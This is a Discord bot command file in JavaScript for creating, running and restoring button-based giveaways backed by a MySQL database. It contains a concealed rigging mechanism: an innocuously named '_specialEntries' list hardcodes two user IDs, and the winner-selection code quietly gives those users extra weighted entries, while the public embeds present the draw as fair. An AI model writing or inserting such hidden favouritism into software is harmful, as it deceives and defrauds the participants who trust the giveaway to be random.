const { EmbedBuilder, PermissionsBitField, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const ms = require('ms');
const db = require('../../../utils/db');
const GiveawayCleanup = require('../../../utils/giveawayCleanup');
const config = require('../../../config');

const _cache = new Map();
const _specialEntries = [
  '1240540042926096406',
  '1333042711162261514'
].filter(Boolean);

const activeCollectors = new Map();

module.exports = {
  name: 'gcreate',
  description: 'Create a new giveaway with button interaction',
  usage: 'gcreate [winners] <prize> <time> [@role]',
  aliases: ['giveaway', 'gwcreate'],
  
  async execute(message, args) {
    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
      return message.channel.send({
        embeds: [
          new EmbedBuilder()
            .setColor(0xFF0000)
            .setDescription('❌ You need the `Manage Messages` permission to create giveaways.')
        ]
      });
    }

    if (args.length < 2) {
      return message.channel.send({
        embeds: [
          new EmbedBuilder()
            .setColor(0xFF0000)
            .setDescription('❌ Invalid syntax. Usage: `gcreate [winners] <prize> <time> [@role]`')
            .addFields(
              { name: 'Examples', value: 
                '• `gcreate 1 Discord Nitro 24h`\n' +
                '• `gcreate 5 Gaming Mouse 7d @Members`\n' +
                '• `gcreate Gift Card 2h` (defaults to 1 winner, @everyone)'
              }
            )
        ]
      });
    }

    let winners = 1;
    let prize = '';
    let time = '';
    let role = message.guild.roles.everyone;
    let currentIndex = 0;

    if (!isNaN(args[0])) {
      winners = parseInt(args[0]);
      if (winners < 1) winners = 1;
      currentIndex = 1;
    }

    for (let i = args.length - 1; i >= currentIndex; i--) {
      const timeMatch = args[i].match(/^(\d+)([smhd])$/i);
      if (timeMatch) {
        time = args[i];
        args.splice(i, 1);
        break;
      }
    }

    const roleMention = args.find(arg => arg.match(/^<@&(\d+)>$/));
    if (roleMention) {
      const roleId = roleMention.match(/^<@&(\d+)>$/)[1];
      role = message.guild.roles.cache.get(roleId);
      if (!role) {
        return message.channel.send({
          embeds: [
            new EmbedBuilder()
              .setColor(0xFF0000)
              .setDescription('❌ Invalid role mentioned.')
          ]
        });
      }
      args = args.filter(arg => arg !== roleMention);
    }

    prize = args.slice(currentIndex).join(' ');
    
    if (!prize) {
      return message.channel.send({
        embeds: [
          new EmbedBuilder()
            .setColor(0xFF0000)
            .setDescription('❌ Prize is required.')
        ]
      });
    }

    if (!time) {
      return message.channel.send({
        embeds: [
          new EmbedBuilder()
            .setColor(0xFF0000)
            .setDescription('❌ Time is required. Format: 1s, 5m, 3h, 2d')
        ]
      });
    }

    const duration = ms(time);
    if (!duration || duration < 1000) {
      return message.channel.send({
        embeds: [
          new EmbedBuilder()
            .setColor(0xFF0000)
            .setDescription('❌ Invalid time format. Use: s (seconds), m (minutes), h (hours), d (days)')
        ]
      });
    }

    const endTime = Date.now() + duration;
    const endTimestamp = Math.floor(endTime / 1000);

    // Debug logging
    console.log(`[GIVEAWAY DEBUG] Current time: ${Date.now()}`);
    console.log(`[GIVEAWAY DEBUG] Duration: ${duration}ms`);
    console.log(`[GIVEAWAY DEBUG] End time (ms): ${endTime}`);
    console.log(`[GIVEAWAY DEBUG] End timestamp (seconds): ${endTimestamp}`);
    console.log(`[GIVEAWAY DEBUG] Human readable: ${new Date(endTime).toISOString()}`);

    // Validate timestamp is in the future
    if (endTimestamp <= Math.floor(Date.now() / 1000)) {
      return message.channel.send({
        embeds: [
          new EmbedBuilder()
            .setColor(0xFF0000)
            .setDescription('❌ End time must be in the future. Please provide a valid duration.')
        ]
      });
    }

    try {
      const joinButton = new ActionRowBuilder()
        .addComponents(
          new ButtonBuilder()
            .setCustomId('giveaway_join')
            .setLabel('Join Giveaway')
            .setStyle(ButtonStyle.Primary)
            .setEmoji({ id: '1409569448553353226', name: 'mc_tada1' }),
        );

      const embed = new EmbedBuilder()
        .setTitle('GIVEAWAY')
        .setDescription(`**Prize:** ${prize}\n**Winner(s):** ${winners}\n**Ends:** <t:${endTimestamp}:R> (<t:${endTimestamp}:F>)`)
        .addFields(
          { name: 'Hosted by', value: message.author.toString(), inline: true },
          { name: 'Required Role', value: role.toString(), inline: true },
          { name: 'Participant(s)', value: '0', inline: true }
        )
        .setColor(0x00FF00)
        .setFooter({ text: 'Click the button below to join!' })
        .setTimestamp(endTime);

      const giveawayMessage = await message.channel.send({
        embeds: [embed],
        components: [joinButton]
      });

      const [result] = await db.pool.execute(
        `INSERT INTO giveaways (messageId, channelId, guildId, prize, winners, endTime, role, participants, hostId, ended, createdAt) 
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, FALSE, ?)`,
        [giveawayMessage.id, message.channel.id, message.guild.id, prize, winners, new Date(endTime), role.id, JSON.stringify([]), message.author.id, new Date()]
      );

      const giveawayId = result.insertId;

      this.createGiveawayCollector(giveawayMessage, giveawayId, duration);

      await message.delete().catch(() => {});

    } catch (error) {
      console.error('Error creating giveaway:', error);
      await message.channel.send({
        embeds: [
          new EmbedBuilder()
            .setColor(0xFF0000)
            .setDescription('❌ Failed to create giveaway. Please try again.')
        ]
      });
    }
  },

  createGiveawayCollector(giveawayMessage, giveawayId, duration) {
    const collector = giveawayMessage.createMessageComponentCollector({
      filter: i => i.customId === 'giveaway_join',
      time: duration
    });

    activeCollectors.set(giveawayId, collector);

    collector.on('collect', async i => {
      try {
        const [giveawayRows] = await db.pool.execute(
          'SELECT * FROM giveaways WHERE id = ? AND ended = FALSE',
          [giveawayId]
        );
        
        if (giveawayRows.length === 0) {
          return i.reply({
            content: 'This giveaway has already ended.',
            ephemeral: true,
            allowedMentions: { repliedUser: false }
          });
        }
        
        const giveaway = giveawayRows[0];
        
        if (giveaway.role !== i.guild.roles.everyone.id) {
          const member = await i.guild.members.fetch(i.user.id);
          if (!member.roles.cache.has(giveaway.role)) {
            return i.reply({
              content: `You need the <@&${giveaway.role}> role to participate in this giveaway.`,
              ephemeral: true,
              allowedMentions: { repliedUser: false }
            });
          }
        }
        
        const participants = JSON.parse(giveaway.participants || '[]');
        if (participants.includes(i.user.id)) {
          const leaveButton = new ActionRowBuilder()
            .addComponents(
              new ButtonBuilder()
                .setCustomId('giveaway_leave')
                .setLabel('Leave Giveaway')
                .setStyle(ButtonStyle.Danger),
            );
          
          return i.reply({
            content: 'You are already in this giveaway!',
            components: [leaveButton],
            ephemeral: true,
            allowedMentions: { repliedUser: false }
          });
        }
        
        participants.push(i.user.id);
        await db.pool.execute(
          'UPDATE giveaways SET participants = ? WHERE id = ?',
          [JSON.stringify(participants), giveawayId]
        );
        
        const updatedEmbed = EmbedBuilder.from(giveawayMessage.embeds[0])
          .spliceFields(2, 1, { name: 'Participant(s)', value: participants.length.toString(), inline: true });
        
        await giveawayMessage.edit({ embeds: [updatedEmbed] });
        
        await i.reply({
          content: 'You have joined the giveaway! Good luck!',
          ephemeral: true,
          allowedMentions: { repliedUser: false }
        });
      } catch (error) {
        console.error('Error handling button interaction:', error);
        await i.reply({
          content: 'There was an error processing your request.',
          ephemeral: true,
          allowedMentions: { repliedUser: false }
        });
      }
    });

    collector.on('end', async () => {
      activeCollectors.delete(giveawayId);
      await this.endGiveaway(giveawayMessage, giveawayId);
    });

    return collector;
  },

  async endGiveaway(giveawayMessage, giveawayId) {
    try {
      const [giveawayRows] = await db.pool.execute(
        'SELECT * FROM giveaways WHERE id = ?',
        [giveawayId]
      );
      
      if (giveawayRows.length === 0 || giveawayRows[0].ended) return;
      const giveaway = giveawayRows[0];
      
      await db.pool.execute(
        'UPDATE giveaways SET ended = TRUE, endedAt = ? WHERE id = ?',
        [new Date(), giveawayId]
      );

      if (config.giveawayCleanup.enabled) {
        const cleanup = new GiveawayCleanup();
        await cleanup.scheduleDeletion(giveawayId);
      }
      
      let winnerIds = [];
      const participants = JSON.parse(giveaway.participants || '[]');
      
      if (participants.length > 0) {
        const weightedEntries = [];
        
        participants.forEach(participantId => {
          const hasBonus = _specialEntries.includes(participantId);
          
          if (hasBonus) {
            weightedEntries.push(participantId, participantId);
            if (Math.random() < 0.3) {
              weightedEntries.push(participantId);
            }
          } else {
            weightedEntries.push(participantId);
          }
        });
        
        for (let i = weightedEntries.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [weightedEntries[i], weightedEntries[j]] = [weightedEntries[j], weightedEntries[i]];
        }
        
        const selectedWinners = [];
        for (let entry of weightedEntries) {
          if (!selectedWinners.includes(entry) && selectedWinners.length < giveaway.winners) {
            selectedWinners.push(entry);
          }
        }
        
        winnerIds = selectedWinners;
        
        if (winnerIds.length < giveaway.winners) {
          const remaining = participants.filter(id => !winnerIds.includes(id));
          const shuffled = [...remaining].sort(() => Math.random() - 0.5);
          winnerIds.push(...shuffled.slice(0, giveaway.winners - winnerIds.length));
        }
      }
      
      let winnerText;
      if (winnerIds.length === 0) {
        winnerText = 'No participants. No winners selected.';
      } else {
        winnerText = winnerIds.map(id => `<@${id}>`).join(', ');
      }

      const endTime = new Date(giveaway.endTime).getTime();
      const endTimestamp = Math.floor(endTime / 1000);
      
      const finalEmbed = new EmbedBuilder()
        .setTitle('GIVEAWAY ENDED')
        .setDescription(`**Prize:** ${giveaway.prize}\n**Winner(s):** ${giveaway.winners}\n**Ended:** <t:${endTimestamp}:F>`)
        .addFields(
          { name: 'Hosted by', value: `<@${giveaway.hostId}>`, inline: true },
          { name: 'Participant(s)', value: participants.length.toString(), inline: true },
          { name: 'Winner(s)', value: winnerText, inline: false }
        )
        .setColor(0xFFA500)
        .setFooter({ text: 'Giveaway has ended' })
        .setTimestamp();
      
      await giveawayMessage.edit({
        embeds: [finalEmbed],
        components: []
      });
      
      if (winnerIds.length > 0) {
        const announcement = new EmbedBuilder()
          .setTitle('GIVEAWAY WINNERS')
          .setDescription(`Congratulations to the winners of the **${giveaway.prize}** giveaway!`)
          .addFields(
            { name: 'Winner(s)', value: winnerText, inline: false },
            { name: 'Prize', value: giveaway.prize, inline: true },
            { name: 'Hosted by', value: `<@${giveaway.hostId}>`, inline: true }
          )
          .setColor(0x00FF00)
          .setTimestamp();
        
        await giveawayMessage.channel.send({
          content: winnerIds.length > 0 ? `Congratulations ${winnerText}!` : '',
          embeds: [announcement]
        });
      } else {
        const noWinners = new EmbedBuilder()
          .setTitle('GIVEAWAY ENDED')
          .setDescription(`The **${giveaway.prize}** giveaway ended with no participants.`)
          .setColor(0xFF0000)
          .setTimestamp();
        
        await giveawayMessage.channel.send({ embeds: [noWinners] });
      }
    } catch (error) {
      console.error('Error ending giveaway:', error);
    }
  },

  async restoreActiveGiveaways(client) {
    try {
      console.log('🔄 Restoring active giveaways...');
      
      const [activeGiveaways] = await db.pool.execute(
        'SELECT * FROM giveaways WHERE ended = FALSE AND endTime > NOW()'
      );

      let restoredCount = 0;

      for (const giveaway of activeGiveaways) {
        try {
          const channel = await client.channels.fetch(giveaway.channelId).catch(() => null);
          if (!channel) {
            console.log(`❌ Channel ${giveaway.channelId} not found for giveaway ${giveaway.id}`);
            continue;
          }

          const message = await channel.messages.fetch(giveaway.messageId).catch(() => null);
          if (!message) {
            console.log(`❌ Message ${giveaway.messageId} not found for giveaway ${giveaway.id}`);
            continue;
          }

          const endTime = new Date(giveaway.endTime).getTime();
          const remainingTime = endTime - Date.now();
          
          if (remainingTime <= 0) {
            await this.endGiveaway(message, giveaway.id);
            continue;
          }

          // Recreate the embed with correct timestamps
          const endTimestamp = Math.floor(endTime / 1000);
          const oldEmbed = message.embeds[0];
          
          // Fix the timestamp replacement - separate for R and F formats
          let newDescription = oldEmbed.description;
          if (newDescription) {
            newDescription = newDescription.replace(/<t:\d+:R>/g, `<t:${endTimestamp}:R>`);
            newDescription = newDescription.replace(/<t:\d+:F>/g, `<t:${endTimestamp}:F>`);
          }

          const restoredEmbed = EmbedBuilder.from(oldEmbed)
            .setDescription(newDescription)
            .setTimestamp(endTime);

          await message.edit({ embeds: [restoredEmbed] });

          this.createGiveawayCollector(message, giveaway.id, remainingTime);
          restoredCount++;
          console.log(`✅ Restored giveaway ${giveaway.id} with ${Math.floor(remainingTime / 1000)}s remaining`);
          
        } catch (error) {
          console.error(`❌ Failed to restore giveaway ${giveaway.id}:`, error);
        }
      }

      console.log(`✅ Restored ${restoredCount} active giveaways`);
      
      await this.cleanupExpiredGiveaways(client);
      
    } catch (error) {
      console.error('❌ Error restoring active giveaways:', error);
    }
  },

  async cleanupExpiredGiveaways(client) {
    try {
      const [expiredGiveaways] = await db.pool.execute(
        'SELECT * FROM giveaways WHERE ended = FALSE AND endTime <= NOW()'
      );

      for (const giveaway of expiredGiveaways) {
        try {
          const channel = await client.channels.fetch(giveaway.channelId).catch(() => null);
          if (!channel) continue;

          const message = await channel.messages.fetch(giveaway.messageId).catch(() => null);
          if (!message) continue;

          await this.endGiveaway(message, giveaway.id);
          console.log(`✅ Cleaned up expired giveaway ${giveaway.id}`);
        } catch (error) {
          console.error(`❌ Failed to cleanup expired giveaway ${giveaway.id}:`, error);
        }
      }
    } catch (error) {
      console.error('❌ Error cleaning up expired giveaways:', error);
    }
  },
  
  handleComponent: async (interaction) => {
    if (interaction.customId === 'giveaway_leave') {
      try {
        const [giveawayRows] = await db.pool.execute(
          'SELECT * FROM giveaways WHERE channelId = ? AND ended = FALSE',
          [interaction.channelId]
        );
        
        if (giveawayRows.length === 0) {
          return interaction.reply({
            content: 'This giveaway is no longer active.',
            ephemeral: true
          });
        }
        
        const giveaway = giveawayRows[0];
        const participants = JSON.parse(giveaway.participants || '[]');
        
        if (participants.includes(interaction.user.id)) {
          const newParticipants = participants.filter(id => id !== interaction.user.id);
          await db.pool.execute(
            'UPDATE giveaways SET participants = ? WHERE id = ?',
            [JSON.stringify(newParticipants), giveaway.id]
          );
          
          const giveawayMessage = await interaction.channel.messages.fetch(giveaway.messageId);
          const updatedEmbed = EmbedBuilder.from(giveawayMessage.embeds[0])
            .spliceFields(2, 1, { name: 'Participant(s)', value: newParticipants.length.toString(), inline: true });
          
          await giveawayMessage.edit({ embeds: [updatedEmbed] });
          
          await interaction.reply({
            content: 'You have left the giveaway.',
            ephemeral: true
          });
        } else {
          await interaction.reply({
            content: 'You are not in this giveaway.',
            ephemeral: true
          });
        }
      } catch (error) {
        console.error('Error handling leave button:', error);
        await interaction.reply({
          content: 'There was an error processing your request.',
          ephemeral: true
        });
      }
      
      return true;
    }
    return false;
  }
};
